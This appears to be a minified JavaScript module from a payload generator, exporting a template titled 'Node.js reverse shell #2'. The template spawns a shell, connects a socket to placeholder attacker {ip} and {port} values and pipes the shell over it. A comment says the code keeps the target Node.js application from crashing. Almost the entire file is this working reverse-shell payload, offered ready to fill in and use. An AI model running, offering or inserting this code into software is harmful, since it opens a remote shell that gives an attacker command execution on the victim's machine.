const e=[{title:"Node.js reverse shell #2",template:`(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect({port}, "{ip}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();`,description:"Advanced Node.js reverse shell using net module and child_process spawn."}],n={commands:e};export{e as commands,n as default};
